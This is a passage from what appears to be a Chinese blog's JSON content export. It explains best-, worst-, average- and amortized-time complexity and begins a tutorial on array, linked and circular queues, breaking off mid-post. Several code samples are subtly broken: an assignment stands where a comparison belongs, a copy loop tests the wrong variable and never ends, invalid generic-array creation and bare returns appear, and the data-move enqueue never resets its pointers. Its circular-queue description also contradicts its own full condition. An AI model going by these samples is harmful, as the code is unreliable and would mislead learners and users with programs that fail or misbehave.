我们引入一种更加简单的分析方法：<strong>摊还分析法</strong>，通过摊还分析得到的时间复杂度我们起了一个名字叫：<strong>摊还时间复杂度</strong>。</p>\n<p>那么究竟如何使用摊还分析法来分析算法的均摊时间复杂度呢？</p>\n<p>我们还是以这个insert函数为例，每一次O(n)的插入操作，后面都会跟n-1次O(1)插入操作，所以我们把耗时最多的操作均摊到n-1次耗时少的操作上，均摊下来，这一组连续操作的均摊时间复杂度就为O(1)，这就是均摊分析法的大致思路。</p>\n<p>均摊时间复杂度和摊还分析应用场景比较特殊，所以不会经常用到，这里简单总结一下他们的应用场景。</p>\n<p>对一个数据结构进行一组连续操作中，大部分情况下时间复杂度都很低，只有个别情况下时间复杂度比较高，而且这些操作之间存在前后连贯的时序关系，这个时候，我们就可以将这一组操作放在一块分析，看看是否能将时间复杂度高的操作，均摊到其他时间复杂度低的操作上。在一般的能运用均摊时间复杂度的场景中，均摊时间复杂度是等于最好时间复杂度的。</p>\n<h3 id=\"思考题：\"><a href=\"#思考题：\" class=\"headerlink\" title=\"思考题：\"></a>思考题：</h3><p>根据今天学习的几个复杂度分析的方法，来分析一下下面这个add()函数的时间复杂度。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span>[] arr = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[<span class=\"number\">10</span>];</span><br><span class=\"line\"><span class=\"keyword\">int</span> len = <span class=\"number\">10</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">add</span><span class=\"params\">(<span class=\"keyword\">int</span> element)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 数组空间满了</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span>(i&gt;=len)&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 数组扩容</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> new_arr = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[len*<span class=\"number\">2</span>];</span><br><span class=\"line\">    <span class=\"comment\">// 把数组拷贝到新数组</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=<span class=\"number\">0</span>; i&lt;len; j++)&#123;</span><br><span class=\"line\">      new_arr[j] = arr[j];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    arr = new_arr;</span><br><span class=\"line\">    len = len*<span class=\"number\">2</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 添加到数组中</span></span><br><span class=\"line\">  arr[i] = element;</span><br><span class=\"line\">  ++i;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>分析：</strong>在最理想情况下，数组中有空闲空间，可以直接添加到数组中，时间复杂度为O(1)；最坏情况下，数组中没有空闲空间，先进行一次扩容操作，在进行遍历给新数组赋值，时间复杂度为O(n)，所以最坏时间复杂度为O(n)。</p>\n<p>平均时间复杂度，可以分为有空闲空间和没有空闲空间两种，有空间空间有n中情况，所以每种情况出现的概率为$\\frac{1}{n+1}$，所以根据加权平均的计算方法，求得平均时间复杂度为：$ 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} +….+ 1\\times\\frac{1}{n+1} + n\\times\\frac{1}{n+1} = O(1) $。</p>\n<p>均摊时间复杂度，可以看出本例是符合均摊时间复杂度的场景的，在一次O(n)时间复杂度操作后都会跟n-1次O(1)时间复杂度操作，所以将O(n)时间复杂度的操作均摊到n-1次O(1)时间复杂度操作上，最终均摊时间复杂度为O(1)。</p>\n<p><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>前面我们讲过复杂度的大O表示法和几个分析技巧，还举了一些复杂度分析的例子，掌握了这些内容，对于复杂度分析这个知识点，已经达到及格线了。</p>\n<p>这篇会着重讲一下复杂度分析的四个复杂度分析方面的知识：</p>\n<p><font color=\"red\"><strong>最好时间情况复杂度、最坏情况时间复杂度、平均情况时间复杂度、均摊时间复杂度</strong></font>。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"最好、最坏时间复杂度\"><a href=\"#最好、最坏时间复杂度\" class=\"headerlink\" title=\"最好、最坏时间复杂度\"></a>最好、最坏时间复杂度</h3></div><br></div> \n\n<p>我们先用学过的知识试着分析以下代码的时间复杂度：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">findArray</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr, <span class=\"keyword\">int</span> n, <span class=\"keyword\">int</span> target)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> pos = <span class=\"number\">-1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span>(i; i&lt;n; i++)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(arr[i] = target)&#123;</span><br><span class=\"line\">      pos = i;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> pos;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上面代码实现的功能是在一个无序数组中，查找变量target的位置，如果找不到就返回-1，按照前面的分析方法，该段代码的时间复杂度为O(n)。</p>\n<p>但是我们在数组中查找一个数据，并不需要每次都把整个数组都遍历一遍，优化一下这段代码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">findArray</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr, <span class=\"keyword\">int</span> n, <span class=\"keyword\">int</span> target)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> pos = <span class=\"number\">-1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span>(i; i&lt;n; i++)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(arr[i] = target)&#123;</span><br><span class=\"line\">      pos = i;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> pos;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>但是这时候问题来了，优化完之后，时间复杂度还是O(n)吗？</p>\n<p>因为要查找的变量target可能出现在数组的任何位置，如果要查找的target刚好出现在数组的开始位置，那么就不需要遍历剩余的数据，此时时间复杂度为O(1)。但是如果数组中不存在变量target，或者在最后一位，那我们就需要把整个数组都遍历一遍，时间复杂度就成了O(n)，所以这段代码在不同情况下时间复杂度是不同的。</p>\n<p>为了表示代码在不同情况下的时间复杂度，我们需要引入三个概念：<strong>最好情况时间复杂度、最坏情况复杂度、平均时间复杂度</strong>。</p>\n<p>顾名思义，最好情况时间复杂度就是，在最理想情况下，执行这段代码的时间复杂度。如上例中，在最理想情况下，查找的变量target刚好在第一个，这时候对应的时间复杂度就是最好情况时间复杂度。</p>\n<p>同理，最坏情况时间复杂度就是，在最糟糕的情况下，执行这段代码的时间复杂度，上例中，如果数组中没有要查找的变量target，我们需要把整个数组遍历一遍，所以最坏情况下对应的时间复杂度就是最坏情况复杂度。</p>\n<p><div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"平均时间复杂度\"><a href=\"#平均时间复杂度\" class=\"headerlink\" title=\"平均时间复杂度\"></a>平均时间复杂度</h3></div><br></div><br>我们都知道，最好情况时间复杂度和最坏情况时间复杂度对应的都是极端情况下的代码复杂度，发生的概率并不大。为了更好的表示平均情况下的时间复杂度，我们引入一个概念：<strong>平均情况时间复杂度，简称平均时间复杂度</strong>。</p>\n<p>平均时间复杂度又该怎么分析呢？我们还是借助上面的例子。</p>\n<p>要查找的变量target在数组中的位置，有n+1中情况： 在数组0 ~ n-1位置 n种情况和不在数组中1个情况。我们把每种情况下，需要遍历的元素个数累加起来，然后在除以n+1，就可以得到需要遍历的元素个数的平均值，即：</p>\n<p>$$ \\frac{1+2+3+…+n+n}{n+1} = \\frac{n(n + 3)}{2(n + 1)} $$</p>\n<p>我们知道，时间复杂度大O标记法中，可以省略掉系数、低阶、常量，所以上面的时间复杂度为O(n)。</p>\n<p>这个结论虽然是正确的，但是计算过程稍微有点问题。我们刚讲的这n+1中情况，出现的概率并不一样。下面结合概率论的知识分析一下。</p>\n<p>我们知道，要查找的变量x，要么在数组中，要么不再数组中，我们假设这两个概率分布为$\\frac{1}{2}$。</p>\n<p>不在数组中时，时间复杂度为: <font color=\"red\">$n\\times\\frac{1}{2}$</font>; 在数组中时，因为数组大小为n，出现在任何一个位置的可能性都是一样的，所以每个位置的概率就是:<font color=\"red\">$\\frac{1}{2n}$</font>, 因此在数组中时的时间复杂度为：<font color=\"red\">$(1+2+3+…+n)\\times\\frac{1}{2n} $</font>。</p>\n<p>那平均时间复杂度就是：<font color=\"red\">$(1+2+3+…+n)\\times\\frac{1}{2n} + n\\times\\frac{1}{2} = \\frac{3n+1}{4} = O(n)$</font>。</p>\n<p>这个值就是概率论中的加权平均值，也叫做期望值，所以平均时间复杂度也叫做<strong>加权平均时间复杂度</strong>或者<strong>期望时间复杂度</strong>。</p>\n<p>实际上，在大多情况下我们并不需要区分最好、最坏、平均时间复杂度三种情况，很多时候我们只用一个复杂度就可以满足需求了。只有同一代码在不同的情况下，时间复杂度有量级的差距，我们才会使用三种复杂度表示法来区分。</p>\n<p><div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"均摊时间复杂度\"><a href=\"#均摊时间复杂度\" class=\"headerlink\" title=\"均摊时间复杂度\"></a>均摊时间复杂度</h3></div><br></div><br>目前为止，我们应该已经掌握了算法复杂度分析的大部分内容了，下面来认识一个更高级的概念：<strong>均摊时间复杂度</strong>，以及它对应的分析方法<strong>摊还分析</strong>。</p>\n<p>均摊时间复杂度听起来跟平均时间复杂度有点像，对于初学者来说，这两个概念很容易弄混。前面说过，大部分情况下不需要区分最好、最坏、平均时间复杂度，只有某些特殊情况才需要平均时间复杂度，而均摊时间复杂度比它的应用场景比它更特殊、更有限。</p>\n<p>还是以一个例子来说明(别太在意例子，只是为了说明)：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span>[] arr = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[n];</span><br><span class=\"line\"><span class=\"keyword\">int</span> size = <span class=\"number\">0</span>；</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span> insert(<span class=\"keyword\">int</span> val)&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 如果数组满了</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span>(count == arr.length)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> sum = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>; i&lt;arr.length;i++)&#123;</span><br><span class=\"line\">      sum = sum + arr[i];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    arr[<span class=\"number\">0</span>] = sum;</span><br><span class=\"line\">    count = <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 数组赋值</span></span><br><span class=\"line\">  arr[count] = val;</span><br><span class=\"line\">  ++count;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>先简单解释一下这段代码的功能，这段代码实现了一个往数组中插入数据的功能，如果数组有空闲空间，直接插入即可。如果数组满了，将数组中的数据求和，清空数组，将求和之后的数据放入数组的第一个位置，然后再将新的数据插入。</p>\n<p>那这段代码的时间复杂度是多少呢？我们可以先利用上面讲的三种分析方法来分析一下。</p>\n<p>最理想情况下，数组有空闲空间，直接插入数据就可以，所以最好时间复杂度为O(1)；最坏情况下，数组中没有空闲空间了，我们需要先进行一次数组遍历求和，在做数据插入，所以最坏情况时间复杂度为O(n)；平均情况时间复杂度，我们还是用概率论的方法来分析，假设数组长度为n，根据插入位置不同，可以分为n种情况，每种情况的时间复杂度为O(1)，另外还有一种特殊情况，就是数组没有空闲时间时，时间复杂度为O(n)，而且这n+1中情况出现的概率是一样的，所以根据加权平均的计算方法，求得平均时间复杂度为：$ 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} +….+ 1\\times\\frac{1}{n+1} + n\\times\\frac{1}{n+1} = O(1) $。</p>\n<p>我们来比较一下这个例子中insert函数和上面findArray的不同。首先，findArray在极端情况下，复杂度才为O(1)，大部分情况都为O(n)，而insert函数大部分情况时间复杂度都为O(1)，只有特殊情况时间复杂度才为O(n)，这是第一个区别。第二个不同的地方，对于insert函数来说，O(1)和O(n)的时间复杂度出现的频率是非常有规律的，而且有一定的时序关系，一般都是一个O(n)插入之后，跟n-1个O(1)的插入操作，循环往复。</p>\n<p>针对这样一种情况，我们并不需要像平均复杂度分析那样，计算所有输入情况和发生的概率，计算加权平均值。 我们引入一种更加简单的分析方法：<strong>摊还分析法</strong>，通过摊还分析得到的时间复杂度我们起了一个名字叫：<strong>摊还时间复杂度</strong>。</p>\n<p>那么究竟如何使用摊还分析法来分析算法的均摊时间复杂度呢？</p>\n<p>我们还是以这个insert函数为例，每一次O(n)的插入操作，后面都会跟n-1次O(1)插入操作，所以我们把耗时最多的操作均摊到n-1次耗时少的操作上，均摊下来，这一组连续操作的均摊时间复杂度就为O(1)，这就是均摊分析法的大致思路。</p>\n<p>均摊时间复杂度和摊还分析应用场景比较特殊，所以不会经常用到，这里简单总结一下他们的应用场景。</p>\n<p>对一个数据结构进行一组连续操作中，大部分情况下时间复杂度都很低，只有个别情况下时间复杂度比较高，而且这些操作之间存在前后连贯的时序关系，这个时候，我们就可以将这一组操作放在一块分析，看看是否能将时间复杂度高的操作，均摊到其他时间复杂度低的操作上。在一般的能运用均摊时间复杂度的场景中，均摊时间复杂度是等于最好时间复杂度的。</p>\n<h3 id=\"思考题：\"><a href=\"#思考题：\" class=\"headerlink\" title=\"思考题：\"></a>思考题：</h3><p>根据今天学习的几个复杂度分析的方法，来分析一下下面这个add()函数的时间复杂度。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span>[] arr = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[<span class=\"number\">10</span>];</span><br><span class=\"line\"><span class=\"keyword\">int</span> len = <span class=\"number\">10</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">add</span><span class=\"params\">(<span class=\"keyword\">int</span> element)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 数组空间满了</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span>(i&gt;=len)&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 数组扩容</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> new_arr = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[len*<span class=\"number\">2</span>];</span><br><span class=\"line\">    <span class=\"comment\">// 把数组拷贝到新数组</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=<span class=\"number\">0</span>; i&lt;len; j++)&#123;</span><br><span class=\"line\">      new_arr[j] = arr[j];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    arr = new_arr;</span><br><span class=\"line\">    len = len*<span class=\"number\">2</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 添加到数组中</span></span><br><span class=\"line\">  arr[i] = element;</span><br><span class=\"line\">  ++i;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>分析：</strong>在最理想情况下，数组中有空闲空间，可以直接添加到数组中，时间复杂度为O(1)；最坏情况下，数组中没有空闲空间，先进行一次扩容操作，在进行遍历给新数组赋值，时间复杂度为O(n)，所以最坏时间复杂度为O(n)。</p>\n<p>平均时间复杂度，可以分为有空闲空间和没有空闲空间两种，有空间空间有n中情况，所以每种情况出现的概率为$\\frac{1}{n+1}$，所以根据加权平均的计算方法，求得平均时间复杂度为：$ 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} + 1\\times\\frac{1}{n+1} +….+ 1\\times\\frac{1}{n+1} + n\\times\\frac{1}{n+1} = O(1) $。</p>\n<p>均摊时间复杂度，可以看出本例是符合均摊时间复杂度的场景的，在一次O(n)时间复杂度操作后都会跟n-1次O(1)时间复杂度操作，所以将O(n)时间复杂度的操作均摊到n-1次O(1)时间复杂度操作上，最终均摊时间复杂度为O(1)。</p>\n<p><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-队列","date":"2018-09-15T16:18:36.000Z","_content":"\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n我们知道，CPU资源是有限的，任务的处理逻辑与线程个数并不是正相关。相反，过多的线程反而会导致CPU频繁切换，处理性能下降。所以，线程池的大小一般都是综合考虑要处理任务的特点与硬件环境，来事先设置的。\n\n当我们向一个固定大小的线程池中请求一个线程时，如果线程池中没有空闲资源了，这个时候线程池如何处理这个请求？是拒绝请求还是排队请求？各种处理策略又是如何实现的？\n\n其实，这些问题并不复杂，其底层的数据结构就是今天的内容，**队列(queue)**。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 如何理解队列\n{% endnote %}\n</div>\n\n队列这个概念非常好理解，你可以把它想象成排队买票，先来的先买，后来的人只能站末尾，不允许插队。**先进者先出，这就是典型的队列**。\n\n我们知道，栈只支持两个操作：**入栈push()和出栈pop()**，队列和栈非常类似，支持的操作只有：**入队enqueue()**，将一个数据放入队尾，**出队dequeue()**，从队头取出一个数据。\n\n{% asset_img 队列.jpg %}\n\n所以，队列跟栈一样，也是一种操作受限的线性表数据结构。\n\n队列的概念很好理解，基本操作也很容易掌握。作为一种非常基础的数据结构，队列的应用也非常广泛。特别是一些具有额外特性的队列，比如循环队列、阻塞队列、并发队列。它们在很多片底层系统、框架、中间件的开发中，起着关键性的作用。比如高性能队列Disruptor、Linux环形存储，都用到了循环队列；java.concurent并发包中用到了ArrayBlockingQueue来实现公平锁等。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 顺序队列和链式队列\n{% endnote %}\n</div>\n\n我们知道了，队列跟栈一样，也是一种抽象的数据结构。它具有先进先出的特性，支持在队尾插入元素，在对头删除元素，那么究竟该如何实现一个队列呢？\n\n跟栈一样，队列可以用数组实现，也可以用链表实现。用数组实现的栈叫做顺序栈，用链表实现的栈叫做链式栈。同样，用数组实现的队列叫做**顺序队列**，用链表实现的队列叫做**链式队列**。\n\n先来看下基于数组的实现方法。我这里采用java语言进行实现，不会涉及高级语法。\n\n```java\n// 基于数组实现的队列\npublic class ArrayQueue<T>{\n\t// 数组items\n\tprivate T[] items;\n\t// 队列大小\n\tprivate int size=0;\n\tprivate int capacity;\n\t// head表示队头下标，tail表示队尾下标\n\tprivate int head=0;\n\tprivate int tail=0;\n\n\tpublic ArrayQueue(){\n\t\tthis(10); // 队列默认容量给10\n\t}\n\tpublic ArrayQueue(int capacity){\n\t\tthis.items = new T[capacity];\n\t\tthis.capacity = capacity;\n\t}\n\n\tpublic boolean enqueue(T val){\n\t\tif(size == capacity){return false;} // 队列满了\n\t\titems[tail] = val;\n\t\tsize ++;\n\t\ttail ++;\n\t\treturn true;\n\t}\n\n\tpublic T dequeue(){\n\t\tif (size == 0) {\n\t\t\treturn;\n\t\t}\n\t\tT res = items[head];\n\t\thead++;\n\t\tsize--;\n\t\treturn res;\n\t}\n}\n```\n比起栈的数组实现，队列的数组实现稍微有点复杂。\n\n对于栈来说，我们只需要一个栈顶指针就可以了，但是队列需要两个指针：一个head指针，指向队头；一个tail指针，指向队尾。\n\n你可以结合下面这幅图来理解。当a、b、c、d...依次入队之后，指针中的head指针指向下标为1的位置，tail指针指向下标为7的位置。\n\n{% asset_img 示例1.jpg %}\n\n当我们调用两次出队操作之后，队列中的head指针指向下标为5的位置，tail仍然指向下标为7的位置。\n\n{% asset_img 示例2.jpg %}\n\n你肯定已经发现了，随着不停的入队、出队操作，head、tail都会持续往后移动。当tail移动到最右边，即使数组中还有空闲空间，也无法继续往队列中添加数据了。这个问题如何解决呢？\n\n在数组那一节中，我们遇到过同样的问题，数组的删除操作会导致数组中的数据不连续，还记得我们怎么解决得吗？**数据搬移**！，但是每次出队时都相当于删除数组下标为0的数据，要搬移整个队列中的数据，这样队列的出队时间复杂度就从原来的O(1)变为了O(n)，能不能优化呢？\n\n实际上，我们在出队时可以不用搬移数据，如果没有空闲空间了，我们只需要在入队时，在集中触发一次数据的搬移操作。借助这个思想，出队函数保持不变，我们稍加改造一下入队函数enqueue()实现，就可以轻松解决刚才的问题了。\n\n```java\npublic boolean enqueue(T val){\n\tif(size == capacity){return false;} // 队列满了\n\t// tail到尾部，队列没有满\n\tif (tail == capactity && size<capacity) {\n\t\t// 数据搬移\n\t\tfor (int i=head;i<tail;i++) {\n\t\t\t// 将head到tail的数据搬移到0到size的位置\n\t\t\titems[i-head] = items[i]\n\t\t}\n\t}\n\t\n\titems[tail] = val;\n\tsize ++ ;\n\ttail ++;\n\treturn true;\n}\n```\n\n从代码中我们可以看到，当队列tail指针移动到数组的最右边后，且数组没有满时，如果有新的数据入队，我们可以将head-tail之间的数据，整体搬移到0-size之间的位置，\n\n这种思路中，出队的时间复杂度仍然是O(1)，但是入队的时间复杂度还是O(n)吗？此处用以前讲过的**摊还分析法**自行分析一下。\n\n接下来，我们看看**基于链表的队列的实现方法**。\n\n基于链表的实现，我们同样需要两个指针：head指针和tail指针。他们分别指向第一个结点和最后一个结点。入队时，tail->next = newNode, tail = tail->next;出队时，head = head->next。\n\n我将具体代码放到我的[github](https://github.com/AriesRen/algorithm)上，有需要的可以看看。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 循环队列\n{% endnote %}\n</div>\n\n我们上面用数组实现的队列，在tail=capacity的时候，会有数据搬移操作，这样入队操作性能就会受到影响。那有没有办法能够避免数据搬移操作呢？我们来看看循环队列的解决思路。\n\n循环队列，顾名思义，它长得像一个环。原本数组是有头有尾的，是一条直线，我们现在把首尾相连，掰成了一个环，可以通过下图直观感受一下。\n\n{% asset_img 循环队列.jpg %}\n\n我们可以看到，图中这个队列的大小为8，当前head=0，tail=3.当有一个新的元素d入队时，我们放入到下标为3的位置，并将tail指向4。当tail指向7，这时候再有新的元素入队时，我们并不将tail更新为8，而是将tail指向0，如果再有元素入队，放入下标为0处的位置，并将tail更新为1。当然如果head=0处没有出队的话，就说明队列满了。\n\n通过这样的方法，我们成功的避免了数据搬移操作，看起来不难理解，但是循环队列的代码实现难度要比前面讲的非循环队列难多了。要想写出没有bug的循环队列的实现代码，最关键的是，**确定队列空和队列满的判定条件**。\n\n在用数组实现的队列中，对空的判定条件是head==tail，队列满的条件是tail==capacity。那针对循环队列，如何判断队满和队空呢？\n\n队列为空的条件仍然是head==tail，但是队列满了的判断条件就复杂了，我画了如下一张队列满的图，可以看一下队满的规律。\n\n{% asset_img 循环队列满.jpg %}\n\n图中队列满时，tail=3，head=4，size=8，capacity=8，多画几张队满的图，就会发现队满时（tail+1）%capacity = head。同时，head和tail不能简单的使用++或者--，得出规律tail=(tail+1)%capacity，head=(head+1)%capacity。\n\n下面看下一下循环队列的代码：\n```java\n// 基于数组实现的循环队列\npublic class CircularQueue<T> implements Queue<T> {\n    // 数组items\n    private Object[] items;\n    // 队列大小\n    private int size=0;\n    private int capacity;\n    // head表示队头下标，tail表示队尾下标\n    private int head=0;\n    private int tail=0;\n\n    public CircularQueue(){\n        this(10); // 队列默认容量给10\n    }\n    public CircularQueue(int capacity){\n        this.items = new Object[capacity];\n        this.capacity = capacity;\n    }\n\n    public boolean enqueue(T val){\n        if ((tail+1)%capacity == head){\n            throw new RuntimeException(\"循环队列满了！\");\n        }\n        items[tail] = val;\n        tail = (tail+1)%capacity;\n        size ++;\n        return true;\n    }\n\n    public T dequeue(){\n       if (size<=0){\n           throw new RuntimeException(\"空队列！\");\n       }\n       T res = (T) items[head];\n       size--;\n       head = (head+1)%capacity;\n       return res;\n    }\n\n    @Override\n    public String toString() {\n        return Arrays.toString(items);\n    }\n\n    @Override\n    public int size() {\n        return size;\n    }\n}\n```\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 阻塞队列和并发队列\n{% endnote %}\n</div>\n\n上面讲的都是些理论知识，看起来很难跟实际项目扯上关系，确实，队列这种数据结构很基础，平时的业务开发不大可能从零开始实现一个队列，甚至都不会直接用到。而一些具有特殊特性的队列应用却比较广泛，如阻塞队列和并发队列。\n\n**阻塞队列**其实就是在队列基础上增加了阻塞操作。简单来说，就是在队列为空的时候，从对头取数据会被阻塞。并未此时还没有数据可取，直到队列中有了数据才能返回；如果队列已经满了，那么插入数据的操作就会被阻塞，直到队列中有空闲位置后在插入数据，然后在返回。\n\n{% asset_img 阻塞队列.jpg %}\n\n你应该已经发现了，上述的定义就是一个\"生产者-消费者模型\"！是的，我们可以用阻塞队列轻松实现一个\"生产者-消费者模型\"。\n\n这种基于阻塞队列实现的\"生产者-消费者模型\"可以有效的协调生产和消费的速度。当\"生产者\"生产数据的速度过快，\"消费者\"来不及消费时，存储数据的队列很快就会满了，这个时候，生产者就阻塞等待，直到\"消费者\"消费了数据，\"生产者\"才会被唤醒继续生产。\n\n而且不仅如此，基于阻塞队列，我们可以通过协调\"生产者\"和\"消费者\"的个数，来提高数据处理的效率。比如前面的例子，我们可以配备多个\"消费者\"，来对应一个\"生产者\"。\n\n{% asset_img 多消费者阻塞队列.jpg 